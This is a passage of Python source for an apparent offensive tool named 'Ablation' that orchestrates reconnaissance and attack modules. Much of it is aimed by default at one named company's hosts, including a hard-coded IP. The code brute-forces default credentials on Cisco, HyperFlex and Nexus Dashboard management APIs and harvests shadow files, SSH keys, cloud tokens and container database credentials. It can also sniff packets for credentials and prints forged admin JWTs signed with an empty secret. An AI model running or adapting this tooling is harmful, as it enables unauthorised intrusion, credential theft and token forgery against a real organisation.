                        'impact':      ('Container escape via privileged mount / '
                                        'Oracle DB cred harvest / ISE service takeover'),
                        'remediation': ('Remove privileged containers; restrict socket permissions; '
                                        'rotate container env secrets'),
                    })
        return self.findings['podman']

    def run_ebpf_analysis(self, target_pid=None):
        """eBPF capability audit + tracing script generation."""
        if not HAS_EBPF:
            self.findings['ebpf'] = {'error': 'ebpf_analyzer module not available'}
            return {}

        result = analyze_ebpf(target_pid=target_pid)
        self.findings['ebpf'] = result

        for finding in result.get('findings', []):
            if finding.get('severity') in ('CRITICAL', 'HIGH'):
                self.findings['vulnerabilities'].append({
                    'severity':    finding['severity'],
                    'type':        f"eBPF: {finding['title']}",
                    'description': finding.get('detail', ''),
                    'impact':      'Kernel privilege escalation / plaintext TLS extraction',
                    'remediation': 'Patch kernel; set unprivileged_bpf_disabled=1; restrict CAP_BPF',
                })
        return result

    def scan_lateral_movement(self, scan_network=True):
        """Credential harvest, SSH keys, API tokens, cloud metadata, subnet scan."""
        if not HAS_LATERAL:
            self.findings['lateral_movement'] = {'error': 'lateral_movement module not available'}
            return {}

        scanner = LateralMovementScanner(
            scan_network=scan_network,
            scan_timeout=0.5,
            max_workers=80,
        )
        result = scanner.run_all()
        self.findings['lateral_movement'] = result

        creds = result.get('creds', {})
        for f in creds.get('files', []):
            if f.get('type') in ('shadow', 'htpasswd', 'aws_credentials', 'docker_config'):
                self.findings['vulnerabilities'].append({
                    'severity':    'HIGH',
                    'type':        f"Credential: {f['type']}",
                    'description': f.get('path', ''),
                    'impact':      'Direct credential access / lateral movement',
                    'remediation': 'Restrict file permissions; rotate exposed secrets',
                })

        for key in result.get('ssh', {}).get('private_keys', []):
            self.findings['vulnerabilities'].append({
                'severity':    'HIGH',
                'type':        'SSH private key exposed',
                'description': key.get('path', ''),
                'impact':      'SSH lateral movement to any host in known_hosts',
                'remediation': 'Remove private keys from host; use agent forwarding only',
            })

        for tok in result.get('tokens', {}).get('tokens', []):
            sev = 'CRITICAL' if tok.get('service') in ('aws', 'gcp', 'azure', 'k8s') else 'HIGH'
            self.findings['vulnerabilities'].append({
                'severity':    sev,
                'type':        f"API token: {tok.get('service', 'unknown')}",
                'description': tok.get('path', ''),
                'impact':      'Cloud/infrastructure control plane access',
                'remediation': 'Rotate token; audit usage in cloud audit logs',
            })

        return result

    def audit_tls(self, targets=None):
        """TLS cipher suite audit against MacStadium ASA targets and any local TLS services."""
        if not HAS_TLS:
            self.findings['tls'] = {'error': 'tls_analyzer module not available'}
            return {}

        analyzer = TLSAnalyzer()

        if targets:
            results = analyzer.analyze_hosts(targets)
        else:
            results = analyzer.analyze_macstadium()

        self.findings['tls'] = {'results': results}

        for r in results:
            weak = r.get('weak_ciphers', [])
            if weak:
                self.findings['vulnerabilities'].append({
                    'severity':    'HIGH',
                    'type':        f"Weak TLS ciphers: {r['host']}",
                    'description': f"{len(weak)} weak suites: {', '.join(weak[:3])}",
                    'impact':      'BEAST/POODLE/SWEET32 downgrade; session decryption',
                    'remediation': 'Enforce TLS 1.2+ with AEAD suites only; disable RC4/3DES/CBC',
                })
            if r.get('expired_cert'):
                self.findings['vulnerabilities'].append({
                    'severity':    'MEDIUM',
                    'type':        f"Expired TLS cert: {r['host']}",
                    'description': r.get('cert_subject', ''),
                    'impact':      'Client certificate validation bypass; MITM surface',
                    'remediation': 'Renew certificate',
                })

        return {'results': results}

    def analyze_process(self, pid):
        """Deep analysis of specific process"""
        enum = ProcessEnumerator(pid)
        
        report = {
            'pid': pid,
            'maps': enum.get_memory_maps(),
            'modules': enum.get_loaded_modules(),
            'fds': enum.get_open_files(),
            'env': enum.get_environment(),
            'wx_regions': enum.find_writable_executable()
        }
        
        return report
    
    def analyze_binary(self, filepath):
        """Deep analysis of specific binary"""
        parser = BinaryParser(filepath)
        info = parser.parse()

        # ELF security analysis
        if HAS_ELF_PARSER and info.get('format') == 'ELF':
            try:
                ep = ELFParser(filepath)
                ep.parse()
                info['elf'] = ep.to_dict()
                sec = info['elf'].get('security', {})
                if not sec.get('pie'):
                    self.findings['vulnerabilities'].append({
                        'severity': 'MEDIUM', 'type': 'ELF: No PIE',
                        'description': filepath, 'impact': 'Fixed base address aids ROP/exploit',
                        'remediation': 'Recompile with -fPIE -pie',
                    })
                if not sec.get('nx'):
                    self.findings['vulnerabilities'].append({
                        'severity': 'HIGH', 'type': 'ELF: No NX (executable stack)',
                        'description': filepath, 'impact': 'Stack shellcode execution possible',
                        'remediation': 'Recompile with -z noexecstack',
                    })
                if sec.get('relro') == 'none':
                    self.findings['vulnerabilities'].append({
                        'severity': 'MEDIUM', 'type': 'ELF: No RELRO',
                        'description': filepath, 'impact': 'GOT overwrite attack surface open',
                        'remediation': 'Link with -Wl,-z,relro,-z,now',
                    })
            except Exception:
                pass

        # Disassemble entry point
        with open(filepath, 'rb') as f:
            if info.get('entry_point'):
                entry = int(info['entry_point'], 16)
                f.seek(entry if entry < 1000000 else 0)
                code = f.read(512)

                engine = DisasmEngine()
                disasm = engine.disassemble(code, entry, count=50)

                info['disassembly'] = disasm[:20]

        return info
    
    def trace_syscalls(self, pid, duration=5):
        """Trace syscalls for a process"""
        tracer = SyscallTracer(pid)
        return tracer.trace_process(duration)
    
    def scan_nginx(self, host: str = None, port: int = 443, use_tls: bool = True):
        """Enumerate nginx attack surface — stub_status, CVEs, alias traversal, SSRF, NX-API."""
        if not HAS_NGINX:
            self.findings['nginx'] = {'error': 'nginx_enum module not available'}
            return {}

        target_host = host or NginxEnumerator.MACSTADIUM_HOST
        enum = NginxEnumerator(host=target_host, port=port, use_tls=use_tls)
        result = enum.run()
        self.findings['nginx'] = result

        for f in result.get('findings', []):
            if f['severity'] in ('CRITICAL', 'HIGH', 'MEDIUM'):
                self.findings['vulnerabilities'].append({
                    'severity':    f['severity'],
                    'type':        f'nginx: {f["type"]}',
                    'description': f['description'],
                    'impact':      f.get('detail', ''),
                    'remediation': f.get('exploit', ''),
                })

        return result

    def scan_jdwp_processes(self, host: str = None):
        """
        Scan local JVM /proc/*/cmdline for JDWP flags + probe remote JDWP ports.
        If host is given, probes that host for JDWP ports (ISE/Cisco targets).
        """
        from java_re import analyze_jvm_flags, scan_jvm_processes, detect_debug_port

        all_findings = []

        # Local /proc scan
        try:
            proc_findings = scan_jvm_processes()
            all_findings.extend(proc_findings)
        except Exception:
            pass

        # Remote port probe — ISE candidates and provided host
        probe_hosts = []
        if host:
            probe_hosts.append(host)
        # ISE candidates from ise_enum if loaded
        if HAS_ISE:
            try:
                from ise_enum import MACSTADIUM_ISE_CANDIDATES
                probe_hosts.extend(MACSTADIUM_ISE_CANDIDATES)
            except Exception:
                pass

        jdwp_results = {}
        for h in probe_hosts:
            hits = detect_debug_port(h)
            if hits:
                jdwp_results[h] = hits
                for hit in hits:
                    if hit.get('jdwp_confirmed'):
                        self.findings['vulnerabilities'].append({
                            'severity':    'CRITICAL',
                            'type':        'JDWP_OPEN',
                            'description': f'JDWP debug port open on {h}:{hit["port"]}',
                            'impact':      'Full JVM control: heap read, arbitrary code eval via Runtime.exec()',
                            'remediation': hit.get('exploit_note', ''),
                        })

        self.findings['java_re']['jdwp_scan'] = {
            'proc_findings': all_findings,
            'remote_results': jdwp_results,
        }

        return {'proc_findings': all_findings, 'remote_jdwp': jdwp_results}

    def enumerate_hyperflex(self, hosts: list = None, timeout: int = 8) -> dict:
        """HyperFlex Connect REST API: brute creds, Intersight claim code, iSCSI/NFS export."""
        if not HAS_HYPERFLEX:
            self.findings['hyperflex'] = {'error': 'hyperflex_enum module not available'}
            return {}
        targets = hosts or []
        results = enumerate_hyperflex_cluster(targets, timeout=timeout)
        self.findings['hyperflex'] = results
        for r in results:
            if r.get('cred_result'):
                self.findings['vulnerabilities'].append({
                    'severity': 'CRITICAL',
                    'type': 'HYPERFLEX_DEFAULT_CREDS',
                    'description': (f"HyperFlex Connect {r['host']} — default creds valid: "
                                    f"{r['cred_result']['user']}:{r['cred_result']['pass']}"),
                    'impact': 'Full cluster control, VM/datastore access, Intersight pivot',
                    'remediation': 'Change admin password; disable HX Connect if not needed',
                })
            if r.get('intersight_claim_code'):
                self.findings['vulnerabilities'].append({
                    'severity': 'CRITICAL',
                    'type': 'INTERSIGHT_CLAIM_CODE',
                    'description': f"Intersight claim code exposed on {r['host']}",
                    'impact': 'Attacker can claim device into their Intersight org',
                    'remediation': 'Rotate device claim codes; restrict HX Connect access',
                })
            if r.get('iscsi_targets'):
                self.findings['interesting'].append({
                    'host': r['host'],
                    'type': 'ISCSI_EXPOSED',
                    'detail': r['iscsi_targets'],
                })
            if r.get('nfs_exports'):
                self.findings['interesting'].append({
                    'host': r['host'],
                    'type': 'NFS_EXPORTS',
                    'detail': r['nfs_exports'],
                })
        return results

    def enumerate_streaming(self, hosts: list = None, timeout: int = 8) -> dict:
        """Kafka/Flink/NiFi/Schema Registry unauthenticated enumeration."""
        if not HAS_STREAMING:
            self.findings['streaming'] = {'error': 'streaming_enum module not available'}
            return {}
        targets = hosts or []
        results = enumerate_streaming_surface(targets, timeout=timeout)
        self.findings['streaming'] = results
        for host, services in results.items():
            kafka = services.get('kafka', {})
            if kafka.get('topics'):
                self.findings['vulnerabilities'].append({
                    'severity': 'HIGH',
                    'type': 'KAFKA_UNAUTH_TOPIC_LIST',
                    'description': f"Kafka {host}:9092 unauthenticated: {len(kafka['topics'])} topics",
                    'impact': 'Data exfil: consume all topics including telemetry, PII, secrets',
                    'remediation': 'Enable SASL_SSL; set ACLs; disable PLAINTEXT listener',
                })
            flink = services.get('flink', {})
            if flink.get('jar_upload_open'):
                self.findings['vulnerabilities'].append({
                    'severity': 'CRITICAL',
                    'type': 'FLINK_UNAUTH_RCE',
                    'description': f"Flink {host}:8081 JAR upload unauthenticated — RCE",
                    'impact': 'Arbitrary code execution on Flink cluster workers',
                    'remediation': 'Enable REST API auth; firewall port 8081',
                })
            nifi = services.get('nifi', {})
            if not nifi.get('auth_required') and nifi.get('reachable'):
                self.findings['vulnerabilities'].append({
                    'severity': 'CRITICAL',
                    'type': 'NIFI_UNAUTH_ACCESS',
                    'description': f"NiFi {host} unauthenticated access",
                    'impact': 'Processor config = arbitrary code exec; cred theft from controller services',
                    'remediation': 'Enable TLS + user authentication in nifi.properties',
                })
        return results

    def enumerate_cisco_apis(self, hosts: list = None, timeout: int = 8) -> dict:
        """Sweep APIC/DNA-C/UCS-M/vManage/RESTCONF/NSO on all hosts."""
        if not HAS_CISCO_API:
            self.findings['cisco_api'] = {'error': 'cisco_api_enum module not available'}
            return {}
        targets = hosts or []
        results = enumerate_cisco_api_surface(targets, timeout=timeout)
        self.findings['cisco_api'] = results
        for host, svcs in results.items():
            for svc_name, svc_data in svcs.items():
                cred = svc_data.get('cred_result')
                if cred:
                    self.findings['vulnerabilities'].append({
                        'severity': 'CRITICAL',
                        'type': f'CISCO_{svc_name.upper()}_DEFAULT_CREDS',
                        'description': (f"{svc_name} on {host} — "
                                        f"default creds: {cred.get('user')}:{cred.get('pass')}"),
                        'impact': self._cisco_api_impact(svc_name, svc_data),
                        'remediation': 'Change default credentials; restrict management plane access',
                    })
        return results

    @staticmethod
    def _cisco_api_impact(svc: str, data: dict) -> str:
        impacts = {
            "apic": "Full ACI fabric control: all tenants, EPGs, contracts, L3Out routes, user accounts",
            "dnac": "All managed device configs, SNMP community strings, SSH credentials, wireless PSKs",
            "ucs_manager": "Full UCS compute control: service profiles, firmware, local user accounts",
            "vmanage": "SD-WAN fabric control: vEdge configs, certificates, routing policies, alarm data",
            "restconf": "IOS-XE running config: TACACS+ keys, BGP neighbor passwords, SNMP communities, user list",
            "nso": "All managed device credentials via authgroups; NSO manages every device it orchestrates",
        }
        nodes = len(data.get('data', {}).get('devices', {}).get('imdata', []) or [])
        base = impacts.get(svc, "Cisco platform access")
        return f"{base} ({nodes} devices if populated)"

    def enumerate_nexus_dashboard(self, hosts: list = None, timeout: int = 8) -> dict:
        """Nexus Dashboard SSO single-pivot, NDFC fabric inventory, Kafka anomaly export."""
        if not HAS_NEXUS_DASH:
            self.findings['nexus_dashboard'] = {'error': 'nexus_dashboard_enum module not available'}
            return {}
        targets = hosts or []
        results = enumerate_nexus_dashboard(targets, timeout=timeout)
        self.findings['nexus_dashboard'] = results
        for r in results:
            if r.get('cred_result'):
                impact = r.get('sso_impact', {})
                self.findings['vulnerabilities'].append({
                    'severity': 'CRITICAL',
                    'type': 'NEXUS_DASHBOARD_DEFAULT_CREDS',
                    'description': (f"Nexus Dashboard {r['host']} SSO creds valid: "
                                    f"{r['cred_result']['user']}:{r['cred_result']['pass']}"),
                    'impact': (f"Single cred = APIC+NDFC+NDO+DataBroker. "
                               f"Sites:{impact.get('sites',0)} Fabrics:{impact.get('fabrics',0)} "
                               f"Switches:{impact.get('switches',0)}"),
                    'remediation': 'Change default credentials; enable MFA; restrict ND mgmt access',
                })
            if r.get('kafka_export_open'):
                self.findings['vulnerabilities'].append({
                    'severity': 'HIGH',
                    'type': 'ND_KAFKA_UNAUTH',
                    'description': f"Nexus Dashboard {r['host']}:9092 Kafka export unauthenticated",
                    'impact': 'Subscribe to all NDI anomaly/telemetry topics without credentials',
                    'remediation': 'Enable Kafka SASL auth in NDI Kafka exporter config',
                })
        return results

    def enumerate_cisco_re(self, host: str, port: int = 443) -> dict:
        """Run all Cisco RE probe functions against a single target host."""
        _PROBE_REGISTRY = []

        if HAS_ASA_ENUM:
            _PROBE_REGISTRY += [
                ('asa', 'mpf_policy',          probe_asa_mpf_policy_exposure),
                ('asa', 'botnet_url_filter',    probe_asa_botnet_url_filter_exposure),
                ('asa', 'asdm_jar',             probe_asa_asdm_jar_exposure),
                ('asa', 'java_deser',           probe_cisco_java_deserialization_surface),
                ('asa', 'anyconnect_profile',   probe_asa_anyconnect_profile_download),
                ('asa', 'mobile_vpn',           probe_asa_mobile_vpn_surface),
                ('asa', 'ios_redirect',         probe_asa_ios_client_redirect_surface),
                ('asa', 'webvpn_session',       probe_asa_webvpn_session_exposure),
            ]
        if HAS_IOS:
            _PROBE_REGISTRY += [
                ('ios', 'arm_debug',            probe_ios_arm_debug_interface_exposure),
                ('ios', 'rommon_vars',          probe_ios_rommon_variable_exposure),
                ('ios', 'crash_artifacts',      probe_ios_crash_artifact_exposure),
                ('ios', 'exception_level',      probe_ios_exception_level_disclosure),
                ('ios', 'cef_fib',              probe_ios_cef_fib_exposure),
                ('ios', 'bgp_rib',              probe_ios_bgp_rib_tree_exposure),
            ]
        if HAS_NXOS:
            _PROBE_REGISTRY += [
                ('nxos', 'bgp_evpn',           probe_nxos_bgp_evpn_control_plane),
                ('nxos', 'vxlan_multisite',     probe_nxos_vxlan_multisite_exposure),
                ('nxos', 'vdc_isolation',       probe_nxos_vdc_isolation_exposure),
                ('nxos', 'fcoe_vsan',           probe_nxos_fcoe_vsan_exposure),
                ('nxos', 'mgmt_proxy',          probe_nxos_management_proxy_exposure),
                ('nxos', 'nexus_dashboard',     probe_nxos_nexus_dashboard_exposure),
                ('nxos', 'mac_arp_table',       probe_nxos_mac_arp_table_exposure),
                ('nxos', 'ecmp_hash',           probe_nxos_ecmp_hash_exposure),
            ]
        if HAS_ISE:
            _PROBE_REGISTRY += [
                ('ise', 'jmx_monitoring',       probe_ise_jmx_monitoring_exposure),
                ('ise', 'heap_dump',            probe_ise_heap_dump_exposure),
                ('ise', 'legacy_api',           probe_ise_legacy_api_endpoint_exposure),
                ('ise', 'spring_framework',     probe_ise_spring_framework_exposure),
                ('ise', 'nginx_auth_bypass',    probe_ise_nginx_auth_bypass),
                ('ise', 'nginx_upstream',       probe_ise_nginx_upstream_config),
                ('ise', 'concurrent_auth_race', probe_ise_concurrent_auth_race_surface),
                ('ise', 'typed_error_fp',       probe_ise_typed_error_fingerprint),
            ]
        if HAS_CISCO_API:
            _PROBE_REGISTRY += [
                ('api', 'aci_microseg',         probe_aci_microsegmentation_exposure),
                ('api', 'aci_tenant_topo',      probe_aci_tenant_network_topology),
                ('api', 'nginx_proxy',          probe_cisco_nginx_proxy_exposure),
                ('api', 'gateway_bypass',       probe_cisco_api_gateway_bypass),
                ('api', 'crosswork_telemetry',  probe_cisco_crosswork_telemetry_exposure),
                ('api', 'tetration',            probe_cisco_tetration_analytics_exposure),
                ('api', 'catalyst_center',      probe_cisco_catalyst_center_mobile_api),
                ('api', 'umbrella',             probe_cisco_umbrella_api_exposure),
            ]

        all_findings = []
        probe_summary = {}
        for (category, name, fn) in _PROBE_REGISTRY:
            if fn is None:
                continue
            key = f"{category}.{name}"
            try:
                result = fn(host, port=port)
            except TypeError:
                try:
                    result = fn(host)
                except Exception as exc:
                    result = [{'severity': 'INFO', 'title': 'probe_error',
                               'detail': str(exc), 'host': host, 'port': port}]
            except Exception as exc:
                result = [{'severity': 'INFO', 'title': 'probe_error',
                           'detail': str(exc), 'host': host, 'port': port}]
            if not isinstance(result, list):
                result = []
            probe_summary[key] = len(result)
            all_findings.extend(result)

        critical = [f for f in all_findings if f.get('severity') == 'CRITICAL']
        high     = [f for f in all_findings if f.get('severity') == 'HIGH']

        for f in critical + high:
            self.findings['vulnerabilities'].append({
                'severity':    f.get('severity'),
                'title':       f.get('title', ''),
                'detail':      f.get('detail', ''),
                'host':        f.get('host', host),
                'port':        f.get('port', port),
                'source':      'cisco_re',
            })

        self.findings['cisco_re'] = {
            'host':           host,
            'port':           port,
            'probes_run':     len(_PROBE_REGISTRY),
            'probe_summary':  probe_summary,
            'total_findings': len(all_findings),
            'critical':       len(critical),
            'high':           len(high),
            'findings':       all_findings,
        }
        return self.findings['cisco_re']

    def generate_report(self):
        """Generate comprehensive report"""
        report_path = Path('/tmp/ablation-report.json')

        # ATT&CK technique tagging — enrich vulnerabilities and privesc paths
        if HAS_ATTCK and tag_findings_list is not None:
            self.findings['vulnerabilities'] = tag_findings_list(
                self.findings.get('vulnerabilities', [])
            )
            self.findings['privesc_paths'] = tag_findings_list(
                self.findings.get('privesc_paths', [])
            )

        with open(report_path, 'w') as f:
            json.dump(self.findings, f, indent=2)
        
        # Text summary
        summary_path = Path('/tmp/ablation-summary.txt')
        with open(summary_path, 'w') as f:
            f.write("="*60 + "\n")
            f.write("ABLATION - AUTONOMOUS ANALYSIS REPORT\n")
            f.write("="*60 + "\n\n")
            
            f.write("PLATFORM\n")
            f.write("-"*60 + "\n")
            p = self.findings['platform']
            f.write(f"OS: {p.get('os')} {p.get('os_release', '')}\n")
            f.write(f"Architecture: {p.get('machine')} ({p.get('arch_bits')} bit)\n")
            if 'kernel' in p:
                f.write(f"Kernel: {p['kernel']}\n")
            f.write("\n")
            
            f.write("CONTAINERS/PLATFORMS\n")
            f.write("-"*60 + "\n")
            docker_info = self.findings['docker']
            k8s_info = self.findings['kubernetes']
            orka_info = self.findings['orka']
            f.write(f"Docker In Container: {docker_info.get('in_container', False)}\n")
            f.write(f"Docker Socket Access: {docker_info.get('socket_access', False)}\n")
            f.write(f"Kubernetes: {k8s_info.get('in_k8s', False)}\n")
            f.write(f"Orka VM: {orka_info.get('in_orka_vm', False)}\n")
            f.write(f"Orka API: {orka_info.get('orka_api_reachable', False)}\n")
            if orka_info.get('in_orka_vm'):
                f.write(f"  Metadata Server: {orka_info.get('metadata_server', {}).get('available', False)}\n")
            f.write("\n")
            
            f.write("NETWORK\n")
            f.write("-"*60 + "\n")
            net = self.findings['network']
            f.write(f"Interfaces: {len(net.get('interfaces', []))}\n")
            f.write(f"Listening Ports: {len(net.get('listening', []))}\n")
            f.write(f"Active Connections: {len(net.get('connections', []))}\n")
            f.write("\n")
            
            f.write("PROCESSES\n")
            f.write("-"*60 + "\n")
            f.write(f"Total: {len(self.findings['processes'])}\n")
            interesting_procs = [p for p in self.findings['processes'] if p.get('interesting')]
            if interesting_procs:
                f.write(f"Interesting: {len(interesting_procs)}\n")
                for p in interesting_procs[:10]:
                    f.write(f"  PID {p['pid']}: {p['name']}\n")
            f.write("\n")
            
            f.write("VULNERABILITIES\n")
            f.write("-"*60 + "\n")
            for vuln in self.findings['vulnerabilities']:
                f.write(f"[{vuln['severity']}] {vuln['type']}\n")
                f.write(f"  {vuln['description']}\n")
                f.write(f"  Impact: {vuln['impact']}\n")
                f.write("\n")
            
            f.write("PRIVILEGE ESCALATION PATHS\n")
            f.write("-"*60 + "\n")
            for path in self.findings['privesc_paths']:
                f.write(f"[{path['severity']}] {path['category']}\n")
                f.write(f"  {path['description']}\n")
                f.write("\n")

            # Swift RE
            sr = self.findings.get('swift_re', {})
            if sr and not sr.get('error'):
                f.write("SWIFT BINARY ANALYSIS\n")
                f.write("-"*60 + "\n")
                f.write(f"Total symbols: {sr.get('total_symbols', 0)}\n")
                f.write(f"SwiftNIO detected: {sr.get('swiftnio_detected', False)}\n")
                f.write(f"gRPC detected: {sr.get('grpc_detected', False)}\n")
                for finding in sr.get('findings', [])[:10]:
                    f.write(f"  {finding}\n")
                f.write("\n")

            # Java RE
            jr = self.findings.get('java_re', {})
            if jr and not jr.get('error') and jr.get('total_classes', 0) > 0:
                f.write("JAVA/JVM ANALYSIS\n")
                f.write("-"*60 + "\n")
                f.write(f"Total classes: {jr.get('total_classes', 0)}\n")
                f.write(f"Frameworks: {', '.join(jr.get('frameworks', []))}\n")
                for dc in jr.get('dangerous_calls', [])[:5]:
                    f.write(f"  [DANGEROUS] {dc.get('method', dc)}\n")
                for sec in jr.get('config_secrets', [])[:5]:
                    f.write(f"  [SECRET] {sec.get('key', '?')} in {sec.get('path', '?')}\n")
                f.write("\n")

            # Crypto audit
            ca = self.findings.get('crypto_audit', {})
            if ca and not ca.get('error'):
                f.write("CRYPTOGRAPHIC AUDIT\n")
                f.write("-"*60 + "\n")
                for cf in ca.get('critical_findings', []):
                    f.write(f"  [CRITICAL] {cf}\n")
                for km in ca.get('key_material', [])[:5]:
                    f.write(f"  [KEY] {km.get('type', '?')} at {km.get('path', '?')}\n")
                jwt_list = ca.get('jwt_findings', [])
                if jwt_list:
                    f.write(f"  JWTs analyzed: {len(jwt_list)}\n")
                f.write("\n")

        return summary_path

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Ablation - Autonomous Reverse Engineering')
    parser.add_argument('--quick', action='store_true', help='Quick platform fingerprint only')
    parser.add_argument('--process', type=int, metavar='PID', help='Analyze specific process')
    parser.add_argument('--binary', metavar='FILE', help='Analyze specific binary')
    parser.add_argument('--syscalls', type=int, metavar='PID', help='Trace syscalls for PID')
    parser.add_argument('--duration', type=int, default=5, help='Syscall trace duration (seconds)')
    parser.add_argument('--privesc', action='store_true', help='Enumerate privilege escalation paths')
    parser.add_argument('--docker', action='store_true', help='Docker enumeration')
    parser.add_argument('--k8s', action='store_true', help='Kubernetes enumeration')
    parser.add_argument('--orka', action='store_true', help='Orka platform enumeration')
    parser.add_argument('--containers', action='store_true', help='Full container/platform analysis')
    parser.add_argument('--swift', metavar='BINARY', help='Swift binary RE analysis')
    parser.add_argument('--java', metavar='PATH', help='Java class/JAR analysis')
    parser.add_argument('--crypto', action='store_true', help='Cryptographic audit (JWTs, keys, TLS)')
    parser.add_argument('--asa', action='store_true', help='Cisco ASA WebVPN enumeration')
    parser.add_argument('--jwt', metavar='TOKEN', help='Analyze JWT token for weaknesses')
    parser.add_argument('--nxos', action='store_true', help='Cisco NX-OS / ACI / APIC enumeration')
    parser.add_argument('--vergeio', metavar='HOST', help='VergeOS HCI (gcweb) enumeration')
    parser.add_argument('--ebpf', type=int, nargs='?', const=0, metavar='PID',
                        help='eBPF capability audit + tracing scripts (optional: target PID)')
    parser.add_argument('--ise', metavar='HOST', nargs='?', const='',
                        help='Cisco ISE 3.1 enumeration (no arg = MacStadium candidates)')
    parser.add_argument('--ise-iso', metavar='PATH',
                        help='Analyze ISE ISO/mountpoint: extract root hash, Oracle config, TACACS+ creds')
    parser.add_argument('--ise-mountpoint', metavar='DIR',
                        help='Already-mounted ISE ISO root (use with --ise-iso)')
    parser.add_argument('--macos', action='store_true',
                        help='macOS malware IOC scan, persistence, TCC audit, DYLD hijack')
    parser.add_argument('--lateral', action='store_true',
                        help='Lateral movement scan: creds, SSH keys, API tokens, cloud metadata, subnet')
    parser.add_argument('--winprobe', metavar='HOST',
                        help='Remote Windows protocol surface: SMB null session, WMI/RPC, WinRM, RDP, MS17-010 fingerprint')
    parser.add_argument('--winprobe-port', type=int, default=445, metavar='PORT',
                        help='SMB port for --winprobe (default 445)')
    parser.add_argument('--winprobe-timeout', type=float, default=5.0, metavar='SEC',
                        help='Per-probe timeout for --winprobe (default 5.0s)')
    parser.add_argument('--tls', metavar='HOST[:PORT]', nargs='*',
                        help='TLS cipher suite audit (no args = MacStadium VPN targets)')
    parser.add_argument('--ios', metavar='HOST', nargs='?', const='',
                        help='Cisco IOS/IOS-XE enumeration (SNMP/TFTP/REST/Telnet)')
    parser.add_argument('--nginx', metavar='HOST', nargs='?', const='',
                        help='Nginx enumeration — version/config/location disclosure, status page, LFI probes (no arg = MacStadium NX-OS 207.254.14.1)')
    parser.add_argument('--podman', metavar='SOCKET', nargs='?', const='',
                        help='Podman socket enumeration: containers, secrets, privileged mounts (no arg = auto-discover)')
    parser.add_argument('--podman-exec-oracle', action='store_true',
                        help='With --podman: exec into Oracle/ISE containers to harvest DB creds')
    parser.add_argument('--hyperflex', metavar='HOST', nargs='+',
                        help='HyperFlex Connect enum: REST API brute, Intersight claim code, iSCSI/NFS')
    parser.add_argument('--streaming', metavar='HOST', nargs='+',
                        help='Streaming pipeline enum: Kafka 9092, Flink 8081, NiFi 8080/8443, Schema Registry')
    parser.add_argument('--nexus-dash', metavar='HOST', nargs='+',
                        help='Nexus Dashboard SSO pivot: APIC+NDFC+NDO creds, Kafka export')
    parser.add_argument('--cisco-api', metavar='HOST', nargs='+',
                        help='Cisco platform API sweep: APIC/DNA-C/UCS-M/vManage/RESTCONF/NSO')
    parser.add_argument('--sniff', type=float, nargs='?', const=10.0, metavar='DURATION',
                        help='Raw packet capture for credential extraction (default 10s, needs root)')
    parser.add_argument('--cisco-re', metavar='HOST',
                        help='Full Cisco RE probe suite: ASA/IOS/NX-OS/ISE/API probes against one host')
    parser.add_argument('--cisco-re-port', type=int, default=443, metavar='PORT',
                        help='Port for --cisco-re (default 443)')

    args = parser.parse_args()
    
    ablation = Ablation()
    
    if args.quick:
        ablation.banner()
        info = ablation.detect_platform()
        print(ablation.platform.report())
    
    elif args.process:
        ablation.banner()
        report = ablation.analyze_process(args.process)
        print(json.dumps(report, indent=2))
    
    elif args.binary:
        ablation.banner()
        info = ablation.analyze_binary(args.binary)
        print(json.dumps(info, indent=2))
    
    elif args.syscalls:
        ablation.banner()
        print(f"[*] Tracing syscalls for PID {args.syscalls} ({args.duration}s)...")
        tracer = SyscallTracer(args.syscalls)
        stats = tracer.trace_process(args.duration)
        print("\n" + tracer.report(stats))
    
    elif args.privesc:
        ablation.banner()
        print("[*] Enumerating privilege escalation paths...")
        enum = PrivescEnumerator()
        paths = enum.enumerate_all()
        print(enum.report())
    
    elif args.docker:
        ablation.banner()
        print("[*] Enumerating Docker environment...")
        docker_enum = DockerEnumerator()
        docker_enum.enumerate_all()
        print(docker_enum.report())
    
    elif args.k8s:
        ablation.banner()
        print("[*] Enumerating Kubernetes environment...")
        k8s_enum = K8sEnumerator()
        k8s_enum.enumerate_all()
        print(k8s_enum.report())
    
    elif args.orka:
        ablation.banner()
        print("[*] Enumerating Orka platform...")
        orka_enum = OrkaEnumerator()
        orka_enum.enumerate_all()
        print(orka_enum.report())
    
    elif args.swift:
        ablation.banner()
        if not HAS_SWIFT_RE:
            print("[-] swift_re module not available")
        else:
            analyzer = SwiftREAnalyzer()
            result = analyzer.analyze(args.swift)
            print(json.dumps(result, indent=2))

    elif args.java:
        ablation.banner()
        if not HAS_JAVA_RE:
            print("[-] java_decompiler module not available")
        else:
            analyzer = JavaREAnalyzer(args.java)
            result = analyzer.analyze()
            print(json.dumps(result, indent=2))

    elif args.crypto:
        ablation.banner()
        if not HAS_CRYPTO_AUDIT:
            print("[-] jwt_crypto_analyzer module not available")
        else:
            auditor = JWTCryptoAnalyzer()
            # Forge MacStadium admin tokens and print
            for payload in MACSTADIUM_FORGE_PAYLOADS:
                tok = forge_token(payload, secret=b'', alg='HS256')
                print(f"[FORGE] {payload['sub']}: {tok}")
            print(auditor.report())

    elif args.jwt:
        ablation.banner()
        if not HAS_CRYPTO_AUDIT:
            print("[-] jwt_crypto_analyzer module not available")
        else:
            auditor = JWTCryptoAnalyzer()
            findings = auditor.analyze_token(args.jwt)
            print(auditor.report())
            print(json.dumps(findings, indent=2))

    elif args.asa:
        ablation.banner()
        if not HAS_ASA_ENUM:
            print("[-] asa_enum module not available")
        else:
            print("[*] Enumerating MacStadium Cisco ASA instances...")
            results = enumerate_macstadium_asas()
            print(json.dumps(results, indent=2, default=str))

    elif args.nxos:
        ablation.banner()
        if not HAS_NXOS:
            print("[-] nxos_enum module not available")
        else:
            print("[*] Enumerating Cisco NX-OS / ACI / APIC targets...")
            result = ablation.enumerate_nxos()
            print(json.dumps(result, indent=2, default=str))

    elif args.vergeio:
        ablation.banner()
        if not HAS_VERGEIO:
            print("[-] vergeio_enum module not available")
        else:
            print(f"[*] Enumerating VergeOS HCI at {args.vergeio}...")
            result = ablation.enumerate_vergeio(args.vergeio)
            print(json.dumps(result, indent=2, default=str))

    elif args.ebpf is not None:
        ablation.banner()
        if not HAS_EBPF:
            print("[-] ebpf_analyzer module not available")
        else:
            pid = args.ebpf if args.ebpf else None
            print(f"[*] eBPF capability audit{f' (PID {pid})' if pid else ''}...")
            result = ablation.run_ebpf_analysis(target_pid=pid)
            # Print ready-to-run tracing scripts
            print("\n[+] Tracing scripts ready:")
            for name, script in result.get('tracing_scripts', {}).items():
                print(f"\n  [{name}]")
                print(f"  {script}")
